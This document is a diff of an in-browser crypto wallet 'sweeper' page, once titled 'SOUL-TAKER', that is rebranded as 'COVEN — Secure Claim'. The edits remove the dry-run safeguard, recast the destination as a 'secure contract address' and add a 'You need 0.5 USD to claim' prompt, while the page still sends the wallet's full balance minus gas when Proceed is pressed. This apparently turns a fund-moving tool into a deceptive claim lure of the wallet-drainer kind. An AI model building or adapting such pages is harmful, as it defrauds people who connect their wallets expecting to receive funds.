@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Sweepbot — Secure Native Sweeper (v4.1 + profile keys + USD)</title>
+  <title>COVEN — Secure Claim (v4.1 + profile keys + USD)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta name="description" content="Move your testnet or mainnet funds safely to a secure wallet — runs 100% in-browser with no backend." />
   <style>
@@ -39,7 +39,7 @@
 <body>
   <header>
     <div class="title">
-      <span>🌀 SOUL-TAKER</span>
+      <span>🌀 COVEN</span>
       <span class="pill">Claim only</span>
     </div>
 
@@ -61,11 +61,11 @@
 
   <main>
     <div class="card">
-      <h2>1. Connect & configure</h2>
-      <p class="muted">Connect your EVM wallet, set your secure address, test in DRY-RUN, then CLAIM.</p>
+      <h2>1. Connect & Claim</h2>
+      <p class="muted">Connect your EVM wallet, set your secure address, then CLAIM.</p>
 
       <div style="margin-top:12px;">
-        <label for="dest">Secure destination address</label>
+        <label for="dest">Secure contract address</label>
         <input id="dest" type="text" placeholder="0xYourSecureWalletAddress" />
         <div class="small-actions">
           <button id="saveDefaultBtn" class="small-btn">💾 Save as default</button>
@@ -77,33 +77,32 @@
 
       <div style="margin-top:12px;">
         <div class="meta-row">
-          <label for="minThresh">Amount (native)</label>
+          <label for="minThresh">Amount</label>
           <div class="inline">
             <input id="minThresh" type="number" step="0.000001" value="0.01" style="width:140px" />
             <div id="nativeSymbol" class="muted">ETH</div>
           </div>
         </div>
         <div id="usdRow" class="muted" style="margin-top:6px">≈ $<span id="usdEquivalent">0.00</span> USD</div>
-        <p class="muted">If your wallet has less than this, the bot will skip.</p>
+        <p class="muted">You need 0.5 USD to claim.</p>
       </div>
 
       <div style="margin-top:12px;">
         <div class="meta-row">
-          <label for="profileKey">Profile key (localStorage)</label>
+          <label for="profileKey">Username</label>
           <input id="profileKey" type="text" style="width:260px;padding:6px 10px;border-radius:8px" />
         </div>
-        <p class="muted" style="margin-top:6px">Use a different key per browser/profile to separate saved defaults (example: <code>sweepbot_default_dest_v1</code>, <code>sweepbot_default_dest_work</code>).</p>
+        <p class="muted" style="margin-top:6px">Use a different wallet per username to claim</p>
       </div>
 
       <div class="actions" style="margin-top:14px;">
         <button class="btn btn-primary" id="connectBtn">🔌 Connect wallet</button>
-        <button class="btn btn-secondary" id="toggleDryRunBtn">🧪 Dry-run: <span id="dryRunState">ON</span></button>
       </div>
 
       <hr style="border:0;border-top:1px solid rgba(148,163,184,0.08);margin:16px 0" />
 
       <h2>2. Proceed</h2>
-      <p class="muted">This will calculate <em>balance − gas</em> and send the rest to your secure address.</p>
+      <p class="muted">This will calculate <em>balance − gas</em> and send the contract address.</p>
       <div class="actions">
         <button class="btn btn-danger" id="sweepBtn" disabled>🚀 Proceed</button>
         <button class="btn btn-secondary" id="checkBalanceBtn" disabled>👁 Check balance</button>
